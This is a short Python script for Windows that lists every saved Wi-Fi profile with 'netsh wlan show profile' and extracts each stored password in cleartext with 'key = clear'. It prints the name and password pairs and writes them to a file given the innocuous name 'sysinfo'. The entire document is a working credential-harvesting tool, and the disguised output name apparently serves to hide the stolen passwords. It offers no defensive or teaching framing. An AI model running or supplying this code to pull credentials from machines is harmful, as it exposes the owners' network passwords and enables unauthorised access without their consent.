import os

x = os.popen('netsh wlan show profile')

wifiList = []

endFile = False

y = x.readlines()

for line in y:
    if "All User Profile" in line:
        line = line[27: len(line)]
        wifiList.append(line.strip())

wifiCredentials = []

for wifiName in wifiList:
    x = os.popen(f'netsh wlan show profile name = "{wifiName}" key = clear')
    infoLines = x.readlines()
    for line in infoLines:
        if "Key Content" in line:
            key = line[28: len(line)].strip()
            wifiCredentials.append([wifiName, key])

print(wifiCredentials)

file = open('sysinfo', 'w')
x = ''
for i in wifiCredentials:
    x += "Wifi Name: " + i[0] + "\n"
    x += i[1] + "\n\n"

file.write(x)
